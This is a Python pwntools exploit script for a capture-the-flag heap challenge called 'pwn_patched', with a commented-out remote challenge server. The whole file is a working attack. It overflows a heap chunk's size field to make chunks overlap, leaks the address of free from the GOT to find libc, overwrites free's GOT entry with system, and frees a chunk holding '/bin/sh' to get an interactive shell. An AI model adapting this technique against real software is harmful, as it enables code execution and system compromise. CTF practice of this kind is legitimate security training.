from kk import *
context(arch = 'amd64',os = 'linux',log_level = 'debug')
io = process('./pwn_patched')
#io = remote('pwn.challenge.ctf.show', 28190)
elf = ELF('./pwn_patched')
libc = ELF('/home/kk/libc-database/libs/libc6_2.27-3ubuntu1.5_amd64/libc.so.6')

def create(size, content):
    io.recvuntil(b"choice :")
    io.sendline(b"1")
    io.recvuntil(b":")
    io.sendline(str(size))
    io.recvuntil(b":")
    io.sendline(content)

def edit(idx, content):
    io.recvuntil("choice :")   
    io.sendline(b"2")
    io.recvuntil(b":")
    io.sendline(str(idx))
    io.recvuntil(b":")
    io.send(content)

def show(idx):
    io.recvuntil(b"choice :")
    io.sendline(b"3")
    io.recvuntil(b":")
    io.sendline(str(idx))

def delete(idx):
    io.recvuntil(b"choice : I ")
    io.sendline(b"4")
    io.recvuntil(b":")
    io.sendline(str(idx))
    
GDB(io)
create(0x18, "aaaa")  # 0
create(0x10, "bbbb")  # 1
edit(0, "/bin/sh\x00" + "a" * 0x10 + "\x41")
delete(1)
create(0x30, p64(0) * 4 + p64(0x30) + p64(elf.got['free']))  #free 910  #puts 970
show(1)
io.recvuntil(b"Content : ")
data = io.recvuntil(b"Done !")

free = u64(data.split(b"\n")[0].ljust(8, b"\x00"))
print(hex(free))
libc_base = free - libc.symbols['free']
log.success('libc base addr: ' + hex(libc_base))
system_addr = libc_base + libc.symbols['system']

edit(1, p64(system_addr))
delete(0)

io.interactive()